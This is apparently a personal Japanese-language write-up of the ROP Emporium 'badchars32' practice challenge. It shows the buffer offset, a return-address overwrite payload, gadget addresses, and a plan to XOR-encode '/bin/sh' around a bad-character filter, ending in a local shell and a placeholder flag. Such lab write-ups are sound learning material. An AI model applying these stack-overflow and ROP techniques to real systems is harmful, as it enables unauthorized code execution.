```
~/ctf/practice-pwn/ROP-Emporium/badchars32:yyy@(*｡˃̵ω ˂̵｡) < ./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> hoge

Exiting
```

```
gdb-peda$ patto AFAA
AFAA found at offset: 44
```

usefulFunctionに遷移させてみる

```
~/ctf/practice-pwn/ROP-Emporium/badchars32:yyy@(๑˃̵ᴗ˂̵)ﻭ < python -c 'print "A" * 44 + "\xa9\x87\x04\x08"' |./badchars32
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
> badchars32  badchars32.dis  flag.txt  peda-session-badchars32.txt  writeup.md

zsh: done                              python -c 'print "A" * 44 + "\xa9\x87\x04\x08"' |
zsh: segmentation fault (core dumped)  ./badchars32
```

usefulFunctionは/bin/lsを実行しているだけ

shellを奪う必要がありそう

[nstrlen]

改行まで何文字か数えて返す

[checkBadchars]

`b i c / <space> f n s` が入力に存在した場合、それを `0xeb` に置換している


```
08048890 <usefulGadgets>:
 8048890:	30 0b                	xor    BYTE PTR [ebx],cl
```
usefulGadgetにxorがあるので、置換された入力値をxorで元に戻す or 最初から変換しておき後で戻す か？

最初からbadcharsに引っかからないように変換しておき、あとからxorで元に戻す方針でやる

/bin/shのうち、"/", "b", "i", "n", "s"は適当な数とxorしておき、badcharsに引っかからないようにしておく

bssセクションをbufferとして使う
```shell
$ readelf -S badchars32
..............
[25] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4
[26] .bss              NOBITS          0804a040 001040 00002c 00  WA  0   0 32
..............
```

今回は前回のwrite432で使った `mov    DWORD PTR [edi],ebp` のようなGadgetがないので、他にないか探す

```
gdb-peda$ ropgadget
ret = 0x804844a
popret = 0x8048461
pop3ret = 0x80488f9
pop4ret = 0x80488f8
pop2ret = 0x8048896
addesp_12 = 0x804845e
addesp_16 = 0x80485a5
```

```shell
$ ROPGadget --binary badchars32 > ropgadget
```

`mov dword ptr [edi], esi ; ret` が使えそう

`pop3ret(pop esi ; pop edi ; pop ebp ; ret)` を使って、ediにbufferのアドレス、esiに文字列、ebpは適当なパディングを入れておく

bufferに `/bin/sh` を xor したものを入れ終わったらxorで元に戻す作業に入る

usefulFunction の `xor    BYTE PTR [ebx],cl` を使うために、pop ebx ; pop ecx ; ret みたいなGadgetがないか探す

これもropgadgetを探すと見つかる -> `0x8048896 # pop ebx ; pop ecx ; ret`

よって、あとはいい感じにROP Chainを組めば終わり

```
~/ctf/practice-pwn/ROP-Emporium/badchars32:yyy@(*｡˃̵ω ˂̵｡) < python exploit.py
[+] Starting local process './badchars32': pid 29251
badchars by ROP Emporium
32bits

badchars are: b i c / <space> f n s
>
[*] Switching to interactive mode
$ ls
$ ls
badchars32    core        flag.txt   peda-session-badchars32.txt  writeup.md
badchars32.dis    exploit.py  input.txt  ropgadget
$
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

memo:

- 大体、pop esi ; pop edi ; pop ebp ; ret の順になっていることが多い？
